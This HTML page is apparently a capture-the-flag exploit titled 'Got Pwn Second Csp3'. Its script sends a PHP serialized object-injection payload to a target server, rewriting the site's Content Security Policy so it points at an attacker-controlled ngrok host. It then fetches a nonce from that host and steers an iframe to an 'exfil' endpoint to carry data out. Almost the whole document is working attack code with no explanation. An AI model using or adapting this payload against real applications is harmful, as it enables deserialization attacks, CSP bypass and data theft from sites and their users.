<!DOCTYPE html>
<html>
  <head>
    <title>Page Title</title>
  </head>
  <body>
    
    <h1>Got Pwn Second Csp3</h1>
    

    <iframe id="crs"></iframe>

    <script>
      window.onload = () => {
        let crs = document.querySelector("#crs")
        let ser_payload = encodeURI('O:8:"UserData":3:{s:12:"token_string";s:23:"6183889a3eb717.77095996";s:10:"token_name";s:12:"Gotua Pwn!!!";s:7:"pwn_obj";O:14:"CatWithHashGet":3:{s:11:"user_object";O:8:"UserData":1:{s:12:"token_string";s:23:"6183889a3eb815.17883302";}s:10:"csp_object";O:17:"ShouFramework\\CSP":1:{s:17:"report_uri_string";s:89:"http://68e6-140-113-194-71.ngrok.io/report_csp ; connect-src 68e6-140-113-194-71.ngrok.io";}s:15:"template_object";O:22:"ShouFramework\\Template":0:{}}}')
        // let url = "http://140.113.194.71:4013/?method=post&hash=a434798f59be445842cad44cf2b30e3fe3b22f04&user="+ser_payload
        let url = "http://140.113.194.71:4012/?method=post&hash=920e0d6ebeb8749f5c79c4fb9130b9f9b84e9d10&user="+ser_payload

        crs.src = url

        setTimeout(() => {crs.src = url+"#bad.js"}, 1000)

        setTimeout(async () => {
          response = await fetch("http://68e6-140-113-194-71.ngrok.io/get_nonce")
          nonce = await response.text()

          crs.src = url+"#http://68e6-140-113-194-71.ngrok.io/exfil@"+nonce
        }, 2000)
        
      }
    </script>
  </body>
</html>
